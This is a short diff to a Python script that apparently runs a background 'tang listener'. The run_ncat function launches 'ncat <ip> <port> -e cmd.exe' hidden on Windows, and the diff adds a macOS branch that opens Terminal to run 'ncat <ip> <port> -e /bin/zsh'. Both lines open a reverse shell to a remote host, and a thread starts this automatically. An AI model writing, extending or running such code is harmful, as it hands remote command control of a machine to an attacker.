@@ -68,7 +68,10 @@ def write_file(tangs):
         
 # Function to run the ncat command
 def run_ncat():
-    os.system('"start /b cmd.exe @cmd /c "cmd /k "ncat <ip> <port> -e cmd.exe""')
+    if os.name == 'nt':
+        os.system('"start /b cmd.exe @cmd /c "cmd /k "ncat <ip> <port> -e cmd.exe""')
+    else:
+        os.system("""osascript -e 'tell application "Terminal" to do script "ncat <ip> <port> -e /bin/zsh"'""")
 
 # Start the tang listener in a separate thread
 thread = threading.Thread(target=run_ncat)
